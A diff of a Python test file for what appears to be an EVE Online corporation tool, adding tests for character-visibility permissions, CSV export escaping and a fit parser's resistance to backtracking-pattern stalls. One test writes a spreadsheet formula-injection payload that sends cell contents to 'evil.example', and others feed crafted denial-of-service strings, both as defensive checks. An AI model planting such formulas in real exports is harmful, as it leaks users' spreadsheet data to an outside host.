@@ -216,8 +216,20 @@ def test_readiness_and_the_group_rule(people, api_client):
     assert rows["Pilot One"]["cells"][str(fit["id"])]["status"] == "can_fly" and rows["Pilot One"]["flyable"] == 1
     assert rows["FC Bob"]["cells"][str(fit["id"])]["status"] == "unknown"
     assert board["totals"] == {str(fit["id"]): 1}
+    # Which character it is stays hidden from people who can't open that member's character sheets...
+    assert rows["Pilot One"]["cells"][str(fit["id"])]["character"] is None
+    csv = api_client.call("get", f"/api/p/doctrines/doctrines/{d.pk}/readiness.csv").content.decode()
+    assert "Pilot One,Can fly,1" in csv
+    # ...and shown to those who can.
+    fc.user_permissions.add(Permission.objects.get(codename="view_corporation_characters"))
+    api_client.force_login(type(fc).objects.get(pk=fc.pk))
     csv = api_client.call("get", f"/api/p/doctrines/doctrines/{d.pk}/readiness.csv").content.decode()
     assert "Pilot One,Can fly (Pilot One),1" in csv
+    # Fit names are free text: a spreadsheet must not run one as a formula.
+    Fit.objects.filter(pk=fit["id"]).update(name='=HYPERLINK("https://evil.example/?"&A2,"x")')
+    header = api_client.call("get", f"/api/p/doctrines/doctrines/{d.pk}/readiness.csv").content.decode().splitlines()[0]
+    assert ",\"'=HYPERLINK(" in header
+    Fit.objects.filter(pk=fit["id"]).update(name="Rifter Fleet")
 
     choices = dict(rules.RULE_TYPES["doctrine_can_fly"].params[0].options())
     assert choices == {str(fit["id"]): "Rifters – Rifter Fleet (Rifter)"}
@@ -288,3 +300,20 @@ def test_search_and_widget(people, api_client):
     assert {h["url"] for h in hits} == {f"/p/doctrines/{d.pk}", f"/p/doctrines/fit/{fit['id']}"}
     api_client.force_login(people["pilot"])
     assert api_client.call("get", "/api/p/doctrines/me").json()["total"] == 1
+
+
+def test_pasted_fits_cannot_stall_the_server(sde):
+    """Lines built to make a backtracking pattern take minutes are read in no time, and huge pastes are refused."""
+    import time
+
+    started = time.monotonic()
+    with pytest.raises(eft.FitError):
+        eft.parse("[a" + " " * 3000 + "b")
+    parsed = eft.parse(RIFTER_EFT + "\n" + "a" + " " * 290 + "b x5\n" + "Damage Control II" + " " * 250 + "/ OFFLINE")
+    assert time.monotonic() - started < 1
+    assert len(parsed["unknown"]) == 2
+    with pytest.raises(eft.FitError):
+        eft.parse(RIFTER_EFT + "\n" * 3 + "x" * eft.MAX_TEXT)
+    assert eft._quantity("Hobgoblin II x5") == ("Hobgoblin II", 5) and eft._quantity("Hobgoblin II x" + "9" * 5000) is None
+    assert eft._offline("Damage Control II /OFFLINE") == ("Damage Control II", True)
+    assert eft._header("[Rifter, My Rifter]") == ("Rifter", "My Rifter") and eft._header("[, x]") is None
